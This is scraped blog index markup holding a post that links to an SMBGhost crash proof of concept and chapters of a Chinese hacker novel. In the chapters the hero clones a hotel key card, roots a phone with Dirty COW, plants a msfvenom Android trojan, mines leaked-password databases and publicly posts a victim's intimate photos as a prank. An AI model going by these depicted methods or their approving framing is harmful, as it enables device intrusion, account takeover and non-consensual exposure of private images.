&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1584521675133.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;代码下载地址：&lt;a href=&#34;https://github.com/insightglacier/SMBGhost_Crash_Poc&#34;&gt;https://github.com/insightglacier/SMBGhost_Crash_Poc&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;代码原始地址(需翻墙)：&lt;a href=&#34;https://gist.github.com/asolino/45095268f0893bcf08bca3ae68a755b2&#34;&gt;https://gist.github.com/asolino/45095268f0893bcf08bca3ae68a755b2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者twitter :&lt;a href=&#34;https://twitter.com/agsolino&#34;&gt;https://twitter.com/agsolino&lt;/a&gt;&lt;/p&gt;
"> SMBGhost 蓝屏代码（测试成功）</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Killer-Chapter-Six/"" data-c="
          &lt;p&gt;&lt;strong&gt;自然界一切事物的运动，无一不是阴阳的对立统一。人的生命运动，其本身就是阴阳对立双方，在不断的矛盾运动中取得统一的过程。&lt;/strong&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1584521521472.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;夜深了，天气有些阴沉，有些发闷，让人感觉呼吸困难。路上还有几个刚刚下班的人往家里走，他们看上去有些疲惫，不时有几辆车呼啸而过。没过多久，狂风大作，电闪雷鸣，路边的树枝开始疯狂的摇头。很快无情的雨点从天空中落下，打在了正在赶路人的身上，人们纷纷拿着自己的包顶在头顶奔跑起来。这突如其来的一场大雨，拦住了深夜要赶回家的人，也惊醒了许多刚刚入睡的人们，还有那些害怕打雷无法入睡的人们。&lt;/p&gt;
&lt;p&gt;风雨总是短暂的，下了一整夜的雨，清晨的空气变得清新起来，王梓伸了一个懒腰，然后拉开了窗帘，外面的阳光飞速的跑进屋内，填满整个卧室。打开窗，一股清爽的空气扑面而来，瞬间让人神清气爽。风雨过后总是会迎来美好，又或者给人们带来些许惊喜，比如雨后彩虹。&lt;/p&gt;
&lt;p&gt;在这样一个美好的早晨，给人的心情也自然是不一样的，王梓准备下楼去公园转转。宅了许久，也应该出去呼吸一下外面的新鲜空气了。简单洗漱下，换了件宽松的衣服王梓救下楼了。&lt;/p&gt;
&lt;p&gt;公园内都是些年纪较大的人，有的在空地上打羽毛球，有的老大爷站在树旁，不断用自己侧面的身体撞向树，然后弹回来，在撞过去，一会在用后背重复刚才的动作。有的老大妈则站在树下练习着嗓子。王梓心里想着当自己老了的时候是否也是差不多的样子，想想，自己摇摇头笑了。继续向前走，不远处可以看到有一群老年人，他们动作轻柔又缓慢，有的还穿着武术服，旁边有一个小音箱播放着音乐。在看最前面的那个人，大概60岁左右的样子，穿了一身黑色武术服，深深的眉毛，眼睛随着他的手移动着，他的动作圆活，连绵不绝，步伐轻盈如行云流水。王梓被这个老大爷吸引住了，觉得很帅气，便多看了会，心中感叹，原来太极拳是这样的优美。过了10多分钟结束了。老大爷走到旁边的凳子旁，从包里拿出一条毛巾来擦头上的汗。&lt;/p&gt;
&lt;p&gt;“大爷，您打的拳简直太漂亮了。”王梓走上前去赞美起大爷。&lt;/p&gt;
&lt;p&gt;“怎么，小伙子，你感兴趣？”大爷反问道。&lt;/p&gt;
&lt;p&gt;“我是看您打，真的很美。吸引了我。” 王梓回复道。&lt;/p&gt;
&lt;p&gt;“太极拳需要常年联系，对人身体有很大的益处，别人动作轻柔缓慢，但是，把每一个动作做到优雅，灵活，必须要要用力。你看我这么大年纪，身体一直很好，比起你们一些年轻人都要好呢。就说你们现在这些年轻人整天就知道对着电脑和手机，又爱熬夜，身体还不如我这个老头子呢。”&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;王梓微微一笑。&lt;/p&gt;
&lt;p&gt;“大爷接着便问道，小伙子你要学不？年轻人学习很快的，对身体也有好处。”&lt;/p&gt;
&lt;p&gt;“我能跟您学么？我倒是有兴趣学习。”&lt;/p&gt;
&lt;p&gt;“当然可以，我很乐意教你这样的年轻人。”&lt;/p&gt;
&lt;p&gt;“那太好了，那我每天就过来跟着你们一起练习吧。”&lt;/p&gt;
&lt;p&gt;“今天我先给你大概介绍下太极拳。自然界一切事物的运动，无一不是阴阳的对立统一。人的生命运动，其本身就是阴阳对立双方，在不断的矛盾运动中取得统一的过程。而太极拳就顺从阴阳变化之理，在一招一势动作之中，阴中含阳，阳中具阴，阴阳互变，相辅而生。”&lt;/p&gt;
&lt;p&gt;王梓听到这里，他默默的把这段话记在了心里，阴阳的对立统一，这个跟他每天接触的计算机中0与1，黑客攻与防有着同样的原理。计算机世界由0和1组成，就是因为有了0和1，经过了几十年的发展演变出了如今纷繁复杂的互联网世界。而黑客的攻防不也是在对立与统一中不断的发生着变化。但是他们万变不离其宗，最终都归为阴与阳，或0和1。&lt;/p&gt;
&lt;p&gt;“太极拳属于内家拳，通过不断的练习使练习者的意、气、形、神融于一体的至高境界的拳法，与道家的思想是一致的。我练习的是陈氏太极拳，要教给你的是74式老架一路。“老大爷接着讲道。&lt;/p&gt;
&lt;p&gt;”我了解了。那我明天几点过来开始学习呢？“&lt;/p&gt;
&lt;p&gt;”明天七点。“&lt;/p&gt;
&lt;p&gt;”好，那我明天就过来。今天我就要先回去了。“&lt;/p&gt;
&lt;p&gt;回到家中，王梓的电脑右下角弹出一封新邮件提醒，是一封pgp加密的邮件（见注解1）。他知道，来新的生意了。他先根据发送过来的邮件头确认了下对方使用的ip地址，确认对方使用的是tor ip地址后，他在自己的聊天服务器中添加了一个临时账号，将对方发送过来的pgp key加密后，回复给了对方。&lt;/p&gt;
&lt;p&gt;没过多久，王梓的聊天软件就有一个头像开始闪动起来。打开来看，正式刚才发送邮件的那个人。&lt;/p&gt;
&lt;p&gt;“您好，47先生，我这里有一个单子，不知道您能不能接。”对方发送过来的消息。&lt;/p&gt;
&lt;p&gt;“出来做生意的，有钱赚就可以接。”&lt;/p&gt;
&lt;p&gt;“我这一单出价500万。”&lt;/p&gt;
&lt;p&gt;王梓看到这个价格后，就在想究竟是什么样单子可以开到这样的价格呢？&lt;/p&gt;
&lt;p&gt;“你想要我帮你拿到什么？”&lt;/p&gt;
&lt;p&gt;“我要你帮我窃取一份计划书。拿到他们的成员名单。”&lt;/p&gt;
&lt;p&gt;”目标是谁？“&lt;/p&gt;
&lt;p&gt;”目标与HH集团有关，与他们的ceo相关，他们ceo手里会有成员名单，在根据成员名单找到存放计划书的人。“&lt;/p&gt;
&lt;p&gt;“目标期限是？”&lt;/p&gt;
&lt;p&gt;“3个月，我会向你的比特币账户先转25个给你，剩下的当你有进展了会分阶段给你。”&lt;/p&gt;
&lt;p&gt;“等我的消息。”&lt;/p&gt;
&lt;p&gt;王梓坐在椅子上，心中充满了疑惑，因为从未有过如此高额佣金的人找过他。究竟是什么样的计划书和名单竟然值这么多钱？他有些迫不及待的想要知道答案。正所谓知己知彼，百战不殆。王梓需要制定新一轮的计划，并需要对对手坐一个全面的了解。&lt;/p&gt;
&lt;p&gt;HH集团一家全国范围内的大型企业，总部设在北京。面对这样一个庞大的企业，渗透进入核心是相当的不容易。&lt;/p&gt;
&lt;p&gt;好久没工作了，是该试试刚刚打造不久的新武器了。王梓已经开始行动起来了。&lt;/p&gt;
&lt;p&gt;奇护公司午休时分&lt;/p&gt;
&lt;p&gt;小白聚精会神的坐在电脑面前，他不紧不慢的操作操作者电脑桌面上的软件，软件的标题显示着burpstuite的字样。此刻的小白正在挖掘一家知名互联网公司——企鹅科技的漏洞。小白平时除了上班，在闲暇的时候都会通过挖掘各大企业的漏洞并提交给这些企业的安全运营团队，这个公司就会给提交漏洞的人相应的金钱奖励。这种模式在国内喝国外都已经非常流行，并且还有专门的相应第三方平台，国内的有补天漏洞响应平台，国外有hackerone的平台。这个赚外快的好处是合法的，并且拿到的奖励是税后的，技术水平好的，一个月可以赚的很丰厚。经过小白的刚刚的操作测试，他发现存在安全问题。接下来，他截了几张图，打开了企鹅科技提交漏洞的页面，把截图上传，并编辑了几行文字便提交上去了。接下来他就是等待着平台审核通过他的漏洞并给出相对应的奖励。小白心里想着，又可以出去吃一顿好吃的了，脸上则自然的流露出一丝笑容。&lt;/p&gt;
&lt;p&gt;（未完待续）&lt;/p&gt;
&lt;h2 id=&#34;注解&#34;&gt;注解&lt;/h2&gt;
&lt;p&gt;1、PGP(Pretty Good Privacy)，是一个基于RSA公钥加密体系的邮件加密软件。可以用它对邮件保密以防止非授权者阅读，它还能对邮件加上数字签名从而使收信人可以确认邮件的发送者，并能确信邮件没有被篡改。它可以提供一种安全的通讯方式，而事先并不需要任何保密的渠道用来传递密匙。它采用了一种RSA和传统加密的杂合算法，用于数字签名的邮件文摘算法，加密前压缩等，还有一个良好的人机工程设计。它的功能强大，有很快的速度。而且它的源代码是免费的。&lt;/p&gt;
">原创小说《杀手》第六章 阴与阳 0与1 攻与防</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Killer-Chapter-Five/"" data-c="
          &lt;p&gt;&lt;strong&gt;黑客，月光下的魔术师。一个看似固若金汤，并投入了巨大的财力、人力、物力打造网络安全防护系统。每天有专人盯着，并可以随时触碰到。就是这样的系统，黑客往往也只会微微一笑，以你意想不到的方式去侵入你的系统。他们喜欢黑夜，他们在黑暗中默默的监视着你的一举一动。而你对此一无所知。&lt;/strong&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1584422783667.jpeg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;解雇&#34;&gt;解雇&lt;/h2&gt;
&lt;p&gt;王梓在写着代码，旁边的两个同事在讨论。&lt;/p&gt;
&lt;p&gt;同事小王先开口说道：“听说最近公司要裁员，咱们哥几个可得好好表现下，别被裁了，特殊时期可别往枪口上撞啊。”&lt;/p&gt;
&lt;p&gt;“你这消息真的假的啊？”同事小张半信半疑地问道。&lt;/p&gt;
&lt;p&gt;“这还能有假，其他几个部门已经有人被开除了。”&lt;/p&gt;
&lt;p&gt;“那你是从哪里得到的消息啊？”&lt;/p&gt;
&lt;p&gt;“另外一个部门的同事跟我说的，消息绝对可靠。没准啊，下一个就该我们部门喽～”&lt;/p&gt;
&lt;p&gt;此时王梓部门的领导走了过来，旁边的两个人赶紧装作忙工作的样子。&lt;/p&gt;
&lt;p&gt;“王梓，你到我办公室来一趟。”&lt;/p&gt;
&lt;p&gt;王梓起身，朝领导办公室走去。旁边的两个同事面面相觑。小张先说话了：“你这乌鸦嘴，还真是，看来他这次要被开喽，他写的代码经常有bug（注解1：），有几次还是我给他调好的呢。平时就不爱说话，也不跟人交流，难怪技术那么差。”&lt;/p&gt;
&lt;p&gt;“是啊，我也给他改过几次呢。咱们先准备准备，领导如果找咱们了，咱们跟领导求求情。”&lt;/p&gt;
&lt;p&gt;“嗯，好。”&lt;/p&gt;
&lt;p&gt;王梓来到领导办公室。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;“王梓啊，你来公司多久了？”领导很客气地问了一句。&lt;/p&gt;
&lt;p&gt;“已经两年了。”&lt;/p&gt;
&lt;p&gt;“时间过的真快啊，都两年了。你看你来公司这么久了，也给公司出了不少力。辛苦了。”&lt;/p&gt;
&lt;p&gt;“没有啦。”王梓挠挠头，有点不好意思。其实，他并不是不知道领导说的意思，只是装作不知道。&lt;/p&gt;
&lt;p&gt;“唉！但是最近公司不景气，业务也开始下滑了。你也了解现在的行内情况……”&lt;/p&gt;
&lt;p&gt;“领导，我辞职。”没等领导说完，王梓便提前开了口。&lt;/p&gt;
&lt;p&gt;领导这样一听，内心有些诧异，心想：“这小子什么时候脑子开窍了。”随即又说道：“你一直干的不错，虽然我总骂你，你也知道，我都是为了你好。我也是实在没办法。”&lt;/p&gt;
&lt;p&gt;此时的王梓没有说话，起身就往外走，快走到门口时，领导说：“兄弟，今晚我请你吃饭。”&lt;/p&gt;
&lt;p&gt;王梓头也没回地说：“不用了。”而他这一次也没有害羞，开门走了出去。王梓心里想“老子早他妈不想干了”，一直以来在这里只是为了掩饰身份，他被开除了就名正言顺了。他早就看不惯这里的人和事了。在这个公司里，唯一对他好的就是翻译小楠。&lt;/p&gt;
&lt;p&gt;办公室里只剩领导一人，他心想：“这小子不会是傻了吧。”&lt;/p&gt;
&lt;p&gt;王梓来到小楠面前，小声地说：“我被开除了。”&lt;/p&gt;
&lt;p&gt;小楠停下手中的工作，有点惊讶。&lt;/p&gt;
&lt;p&gt;“为什么啊？不行，我去跟领导说说。”小楠起身要去找领导，不过被王梓用双手按在工位上。&lt;/p&gt;
&lt;p&gt;“没事，我正好也换换环境，最近也挺辛苦，好好休息一下。”&lt;/p&gt;
&lt;p&gt;“你别难过哦。你能这么想，也挺好的。”小楠安慰王梓。&lt;/p&gt;
&lt;p&gt;“这样吧，我晚上请你吃饭。谢谢你最近这段时间每天给我带早餐，今晚你就跟着我，姐带你吃香的，喝辣的去。”。&lt;/p&gt;
&lt;p&gt;“好～”王梓傻笑。&lt;/p&gt;
&lt;h2 id=&#34;约会&#34;&gt;约会&lt;/h2&gt;
&lt;p&gt;炎热的夏季的傍晚，小楠跟王梓走在去餐馆的路上。两个人并排走着，也没有进行什么交谈。小楠今天穿着没有进行太多的打扮，即使这样也如仙子般美丽出众，他们就这样走着，总会有人朝他们两个人看过来。可能小楠已经习惯了这些，不以为然。反倒是王梓有些不好意思。&lt;/p&gt;
&lt;p&gt;“我们这是准备去吃什么”？王梓开口问。&lt;/p&gt;
&lt;p&gt;“一会到了，你就知道了”。&lt;/p&gt;
&lt;p&gt;“哦”。&lt;/p&gt;
&lt;p&gt;又走了一会。他们在前方左拐，可以看到不远处有几棵参天大树，看上去有很多年头了。树的周围有茂密的草，绿油油的，在草丛中有几朵盛开着的鲜花，格外漂亮。距离草不远处，有一块方形的纯木制牌子，上面写着松本楼几个汉字，下面是英文。在几棵树的后面，有个白色的三层楼，而这个楼就是松本楼这家餐厅。小楠对王梓说：“就是前面这家餐厅了。”&lt;/p&gt;
&lt;p&gt;“这个餐厅应该有些历史了吧。”&lt;/p&gt;
&lt;p&gt;“嗯嗯，这个是一家连锁店，有些年头了，我们赶紧进去吧。等进去了，边吃边跟你说说。让你开开眼。”&lt;/p&gt;
&lt;p&gt;“嗯嗯，好”！王梓笑笑。&lt;/p&gt;
&lt;p&gt;其实，王梓从内心中还是挺喜欢小楠的，他为此，通过社工库里查到了小楠的163邮箱密码等账户，通过这个邮箱密码，王梓看到了小楠的uber记录，知道了她常去的一些地方。而今天来的这个地方，王梓并没有见小楠以前来过。&lt;/p&gt;
&lt;p&gt;他们进入店里，服务员们很热情的跟他们打招呼，而小楠也很礼貌的回应，其中一位穿着像是日本武士服的服务员带着他们进入餐厅。经过一扇木格拉门，这里整体颜色是深棕色，材质大多以木质为主，墙壁是由很多相框拼成的，王梓朝后看去，木门上有两个穿着和服女人的画，一个在手里拿着琴，另外一个在跳舞。而这里因为人也不少，还有来回走动的穿着和服的服务员。客人桌上的酒壶等都是日式的。在这里日式的风情浓厚。&lt;/p&gt;
&lt;p&gt;安排了一个空位坐下。两人开始点菜。&lt;/p&gt;
&lt;p&gt;“怎么样？很棒吧？”&lt;/p&gt;
&lt;p&gt;“嗯嗯，从来没来过这样的地方”&lt;/p&gt;
&lt;p&gt;“我就知道你没来过，特意来带你见识见识的。今天随便点，我请客。”&lt;/p&gt;
&lt;p&gt;王梓腼腆的笑笑，有些不好意思。&lt;/p&gt;
&lt;p&gt;两个人点了松竹梅，还有刺身拼盘，拼盘总由海胆赤背三文鱼海螺肉北极贝深海生蚝。当然还有日本烧肉，小楠店了厚切牛舌，牛小排雪花牛肉。&lt;/p&gt;
&lt;p&gt;小楠指着深海生蚝说，“这个深海生蚝新鲜至极，我在日本做交换生的时候，这个生蚝被我一口吞下。真的是太爽了。&lt;/p&gt;
&lt;p&gt;王梓只顾着一直点头。而小楠则在一旁不停的跟王梓介绍，还讲了她做交换生的一些事。&lt;/p&gt;
&lt;p&gt;在这灯光有些朦胧的餐厅里，小楠神采飞扬，丝毫没有停下说话多吃些东西的意思，而另一旁的王梓，完全插不上什么话，只好边吃，边嗯嗯的答应着，不时来一句，好吃～。今晚就在这样的画面中度过了。&lt;/p&gt;
&lt;p&gt;吃完，王梓送小楠回家，并对小楠道谢。在车上，因为两个人都喝了些酒，但是都没有喝多，小楠笑到，“不用那么客气啦”。&lt;/p&gt;
&lt;p&gt;王梓的心里很清楚，他这样身份特殊的人是不能有感情的。他的身份不能被别人知道，对于感情，一旦陷入进去，那么给他身边的人带来的必将是痛苦。所以，很多时候，他都只是在装傻，装做什么都不知道。这是王梓的秘密，一个别人都不感兴趣的秘密。&lt;/p&gt;
&lt;h2 id=&#34;海南&#34;&gt;海南&lt;/h2&gt;
&lt;p&gt;一望无际的蓝色天空，海水在一下一下的拍打着沙滩。王梓穿着一件白色短袖t恤，一条蓝色短裤，戴着一副墨镜，正躺在沙滩上晒着太阳。阳光晒到身上，暖洋洋的。此时的他什么都没想，就静静的听着这海水的声音。这个时候出来旅游的人不多，没有人山人海，也没有那中喧闹。可以拥有自己的时间。离开了喧闹的都市，什么都不用想，全身心的放松，同时呼吸着新鲜的空气，这感觉真的是太棒了。&lt;/p&gt;
&lt;p&gt;夕阳的余晖洒向大地，路上的行人三俩成群，有情侣，有大人接小孩子放学的，还有与朋友，与闺蜜一起。他们有说有笑，看上去很幸福。放眼望去，似乎只有王梓一个人独自走着。他看着过往的路人，在看向远处的天边，火烧云很美。&lt;/p&gt;
&lt;p&gt;“妈妈，妈妈，我想要吃冰淇淋，给我买好不好“。旁边不远处的小女孩指着麦当劳的店对她的妈妈说。&lt;/p&gt;
&lt;p&gt;小女孩的妈妈摸摸她的头，笑笑，然后准别抱起小女孩，就在这时，从这妈妈的身后，有一个看上去20岁左右的小伙子跑了过来，因为跑的速度太快，她撞倒了这位年轻的母亲。&lt;/p&gt;
&lt;p&gt;”唉，你这个人小伙子，走路注意点哦。“&lt;/p&gt;
&lt;p&gt;小伙子听到这话，停下脚步，回过头。本以为他会道歉，没想到他却说：”谁叫你挡我的路了。活该。“说完就跑了。不等年轻的母亲说什么。年轻的母亲只好自己站起来，抱起女儿，朝着麦当劳走去。&lt;/p&gt;
&lt;p&gt;王梓则继续朝酒店走去。&lt;/p&gt;
&lt;p&gt;来到了酒店的大厅，这时一家四星级的酒店。在酒店的前台，王梓看到了刚才撞人的小伙子。此时这个小伙子正在跟前台的服务员不依不饶，一看就是在闹事。酒店的服务员一直在苦苦的解释着什么，但是小伙子却越来越凶，叫声越来越大。&lt;/p&gt;
&lt;p&gt;“把你们经理找来！”&lt;/p&gt;
&lt;p&gt;“先生，请您不要为难我”。&lt;/p&gt;
&lt;p&gt;服务员耐心的劝说着。但是他依然不依不饶。&lt;/p&gt;
&lt;p&gt;这个小伙子带了耳坠，染了一头金黄色的头发，穿着一件白色衬衫，脖子上戴了一条金色的项链，黑色休闲裤，一双黑色休闲鞋。看上去很时尚。穿的衣服都是名牌。王梓判断应该是富二代和官二代。对于他的这种行为，王梓是极度讨厌的，不懂得礼貌，一点教养都没有。仗着家里有钱，就到处欺负人。多半是从小父母太惯着了。&lt;/p&gt;
&lt;p&gt;就在这个时候，一个身材瘦弱的女子，化了很浓的妆，穿的很性感的女子走到了小伙子面前，对他说：”哎，我说你怎么回事，我在电梯那等你半天了，你在这这干什么呢？还上不上去啊。“&lt;/p&gt;
&lt;p&gt;”我这里有点事，一会儿就上去。你在等等“。&lt;/p&gt;
&lt;p&gt;”老娘可没功夫等你。你快点。“&lt;/p&gt;
&lt;p&gt;”好，走，宝贝儿，咱们这就上去。“然后回头对服务员说道：”看我明天在来找你。“&lt;/p&gt;
&lt;p&gt;”你跟她什么关系啊，还明天找她来。“。&lt;/p&gt;
&lt;p&gt;”没关系，没关系“。说着就搂着性感的女子的朝客房走去。王梓他们三个人一起走进了电梯。王梓刷了卡，按了电梯，两个人在一起开始甜蜜起来。看来王梓跟她们在同一层。到了，14层，两个人先往电梯外走，王梓实在是对两个人厌恶至极，绝对给他们一个小小的惩罚。&lt;/p&gt;
&lt;p&gt;在要出电梯的时候，王梓加快了脚步，撞向那个年轻人，同时右手两根手伸向小伙子的裤子后兜里，夹出了年轻人的房卡。&lt;/p&gt;
&lt;p&gt;”哎哎哎，急着敢死去啊。“&lt;/p&gt;
&lt;p&gt;”对不起“。王梓本来是不想跟他说什么话的，怕与他纠缠不清，还是说了。&lt;/p&gt;
&lt;p&gt;”下次注意点。“&lt;/p&gt;
&lt;p&gt;王梓朝先进了自己的房间，而两个人就在王梓房间附近，小伙子手伸到屁股后面去拿房卡，可是没找到，开始四处翻兜找卡。一旁的妹子急了，遍与他吵起来。&lt;/p&gt;
&lt;p&gt;王梓回到自己的房间，拿出一个白色的设备（acr122u：nfc安全入门工具，黑客常用来破解mifare1类卡），把房卡放到了设备上，又拿出了一张空白的卡。打开电脑。不到1分钟的功夫，王梓便复制了隔壁人的房卡。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1584422650768.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;center&gt;acr122u 读写器样子（图片来自网络，如侵删）&lt;/center&gt;
&lt;p&gt;他走出房间，对着正在争吵的两人说道：”我听说你们的房卡不见了？那个，我刚才在大堂的时候捡到一张卡，你看是不是你们的。“&lt;/p&gt;
&lt;p&gt;小伙子接过卡，刷了下门，门发出解锁的声音。打开后，两个人看也不看王梓就走进屋，丝毫没有表示感谢的意思。&lt;/p&gt;
&lt;p&gt;过了一会。王梓准备行动。他走到对面的房门，耳朵贴在门上，听里面的声音，此刻的两个人应该正在洗漱间里边洗澡边玩闹着。王梓刷了卡，小心翼翼的打开门，房间里，两个人的衣服散落在床上，手机房子电视下面的桌子上。有一台三星的，一台iphone7。王梓看了下三星的手机，没有密码。他利用最近新出的dirty cow（脏牛）漏洞提升了最高权限，同时下载并运行了事先准备好的android系统的木马程序（apk木马：此处使用的利用msfvenom生成的android木马。文件后缀为apk。具有远程命令执行的程序）。而在王梓房间中的电脑屏幕上，黑色背景绿色字符的窗口多出了几行字符串。那是木马成功连接到王梓电脑的几行字符串。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1584422676141.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;center&gt;以上是msfconsole 中对手机摄像头拍照的操作&lt;/center&gt;
&lt;p&gt;王梓放下手机，赶紧离开了他俩的房间。&lt;/p&gt;
&lt;p&gt;王梓通过在电脑中，下载了那个人手机的照片，通讯录，同时对手机中的一些令牌信息进行了获取。手机里的照片没有什么，都比较正常。当然，通过手机里获取到的信息。王梓把这个人的邮箱地址和手机号码，放入了社工库中进行搜索。很快的，就差到对方注册的一些网站，以及用户名和密码，地址，身份证号等信息。一切的秘密都显示在了王梓的面前。王梓发现了他的网盘，并登陆了进去。这里的照片，显示了这个小伙子与另外一位姑娘的关系非常亲密，更加让王梓觉得有趣的是还有艳照。&lt;/p&gt;
&lt;p&gt;恶作剧要开始了，王梓通过获取的信息，很容易的就登陆进了对方的微博，通过他的微博，王梓找到了此时正和他在一起的姑娘的微博和与他发生艳照的姑娘。王梓想着，两个人应该出来了。他发了一条微博，上传了艳照，并@了两个姑娘。&lt;/p&gt;
&lt;p&gt;没过一会，王梓就听到隔壁两个人吵架的声音，紧接着就听到摔门的声音。从隔壁屋内传来“是谁！是谁！谁干的！啊！！！”。王梓躺在床上得意的笑。&lt;/p&gt;
&lt;p&gt;（未完待续）&lt;/p&gt;
&lt;h2 id=&#34;术语解释&#34;&gt;术语解释&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;社工库:社工库是一个用户密码等信息的集合。汇总了黑客以及网络泄漏出来的信息积累建立起来的平台或者系统。通过这个平台或者系统可以关联出一个人的用户名，密码，身份，地址等信息。目前网络上有公开的这类系统，也有很多自己搭建并且不公开的系统。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;白色设备：acr122u，生活中常见的饭卡，酒店房卡、门禁卡等的读写工具。价格很便宜。是一款研究nfc安全的入门工具。想要进一步了解的，可以自行搜索相关文章。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;dirty cow：最近一段时间爆出的linux全版本提权漏洞，中文被称为脏牛漏洞，可以进行提升至root权限，linux以及基于linux的系统都可以提升权限。最新的android 7.0系统也受影响。root权限是系统最高权限，黑客可以进行任何的操作。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;android木马：利用msfvenom生成的apk格式的远程控制木马。msfvenom在老版本中名为msfpayload，著名的metasploit framework框架中的工具。利用metasploit framework的程序可以进行管理。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Bug：Bug,本意为“臭虫”，指现在计算机和程序中隐藏的或者未知的缺陷或者漏洞，这些缺陷或者漏洞会导致系统崩溃，程序运行不正常，错误的结果等；在网络安全领域则是安全缺陷，黑客可以通过它在未授权的情况下入侵系统。当然游戏中也存在Bug，比如打dota的时候看不到英雄了，进入到了不能进入的区域等都属于Bug。&lt;br&gt;
bug有硬件问题，也有应用系统和软件的问题。软件的Bug，狭义概念是指软件程序的漏洞或缺陷，广义概念（除此之外）还包括测试工程师或用户所发现和提出的软件可改进的细节，或与需求文档存在差异的功能实现等。&lt;br&gt;
格蕾丝•赫柏（Grace Murray Hopper），是一位为美国海军工作的电脑专家，也是最早将人类语言融入电脑程序的人之一。而代表电脑程序出错的“Bug”这一名字，正是赫柏取的。&lt;br&gt;
与Bug相对应，人们将发现Bug并加以纠正的过程叫做“Debug”(中文称作“调试”），意即“捉虫子”或“杀虫子”。也是调试的过程。&lt;br&gt;
后来在很多的软件测试中，人们都用Bug来说明那些问题。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
">原创小说《杀手》第五章 恶作剧</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Killer-Chapter-Four/"" data-c="
          &lt;h2 id=&#34;暗流&#34;&gt;暗流&lt;/h2&gt;
&lt;p&gt;暗潮涌动，当浮现出来的那一刻，必定是一场惊涛骇浪。50亿的信息泄漏已经够让人膛目结舌。似乎国内因为这一切变得平静，而在国际上，维基解密网站发布CIA使用的黑客工具包，一群网络中一名名为“影子”的组织劲爆出美国NSA使用的网络武器库。这个超级网络武器库对黑客们来说无疑是一场饕餮大餐。那黑夜中无数双眼睛变得无比的亮，各自忙碌着。&lt;/p&gt;
&lt;p&gt;王梓看着这个超级武器库，内心大吃一惊，技术超前，覆盖全面，内容丰富。这注定是一个无眠的夜晚，王梓不断对其进行分析，并完善到自己的武器库中。&lt;/p&gt;
&lt;p&gt;不止一次让王梓深深的感觉到人外有人，天外有天。单单靠他一个人不行，如今已不是个人英雄主义的时代。他需要伙伴，一起并肩作战的伙伴。就如网络武器库就是一支有精英队伍所打造出来的。而王梓就要建立一支这样的民间队伍。&lt;/p&gt;
&lt;p&gt;太阳升起又落下，王梓站起身，伸了伸懒腰。看了下时间，晚上8点钟。正好可以下楼出去，顺便吃点东西。这个时候的晚上生活很是丰富。有穿着时尚又性感的美女在遛狗，有父母带着小孩子在散步的，有说有笑，而在不远处播放着最炫民族风，大妈们正在起劲的跳着广场舞，还有坐在小区椅子的大爷。王梓走在路上，徐徐的微风吹来，吹散了一脸的疲倦，顿时精神起来。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h2 id=&#34;初次相遇&#34;&gt;初次相遇&lt;/h2&gt;
&lt;p&gt;突然，王梓的肩膀从身后被撞了一下子，他的身子一歪，差点摔倒。此时一位姑娘站在他的面前。这位姑娘戴着一顶深蓝色的鸭舌帽，穿着白色短袖心领T恤，牛仔裤上有几个大的不规则破洞，穿着一双白色球鞋，而脚底下踩着一个滑板。&lt;/p&gt;
&lt;p&gt;”嘿，对不起！“。姑娘回过头对王梓说。&lt;/p&gt;
&lt;p&gt;一阵风吹过，吹起了姑娘的长发，王梓这才看清了姑娘的脸，没有化妆，一张圆脸，眼睛的大大的，由于运动的缘故，脸颊微微泛红。跟姑娘的美貌比起来，让人更印象深刻的是一种帅气，整个热干净，清爽。这是王梓内心中的第一印象。&lt;/p&gt;
&lt;p&gt;姑娘见王梓一直盯着她看不说话。便说了句傻逼，踩着滑板扬长而去。剩下呆愣的王梓站在那里。直到从王梓的肚子发出咕噜的声音，王梓才清醒过来，该去吃东西了。王梓走进了一家小店，人不是特别多，王梓找了个靠墙的位置坐下，点了份蛋炒面。在他的前面一桌，一个小七八岁的小女孩在认真的做作业，小女孩偶尔会探头，当看到王梓正在看她时，她只是冲着王梓嘻嘻笑，然后继续低头做作业。不一会蛋炒面上来了，一份普普通通的蛋炒面，王梓则大口的吃起来。&lt;/p&gt;
&lt;p&gt;吃完饭回来，王梓继续来完善自己的武器库。对于如此强大的黑客武器，应该充分利用才是，王梓结合他自己做的全球扫描系统——insight，一切编写完成，按下回车，屏幕上的一行行的字符流动着，代表着一台台的电脑被成功控制。&lt;/p&gt;
